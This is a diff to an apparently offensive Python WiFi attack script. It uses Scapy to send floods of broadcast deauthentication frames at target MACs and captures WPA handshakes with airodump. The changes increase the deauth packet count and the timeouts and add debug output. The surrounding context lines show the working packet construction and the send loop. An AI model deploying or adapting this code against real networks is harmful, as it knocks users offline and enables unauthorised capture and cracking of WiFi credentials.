@@ -25,10 +25,10 @@ BOLD    = "\033[;1m"
 REVERSE = "\033[;7m"
 
 
-
-packet_sniff_timeout = 10
-timeout_airodump = 10
-deauth_packets = 60
+#Set the parameters like you want
+packet_sniff_timeout = 20
+timeout_airodump = 20
+deauth_packets = 200
 
 
 
@@ -147,7 +147,7 @@ if bssid_list:
 
             packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac)/Dot11Deauth()
 
-            print(BLUE,f"[+] DeAuth for MAC : {mac}",RED)
+            print(BLUE,f"\n[+] DeAuth for MAC : {mac}\n\n",RED)
 
             
             sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1),RESET# BOOM wifi deauth
@@ -165,6 +165,7 @@ if bssid_list:
                 print(BOLD, GREEN,f'BOOM ! For {mac} the Handshake is : {handshake}', RESET)
             else:
                 print(RED,"[-] No handshake Found",RESET)
+                print(BLUE,f'[*] Result of Airodump : {output} ')
 
         deauth_wifi(mac, interface)
 
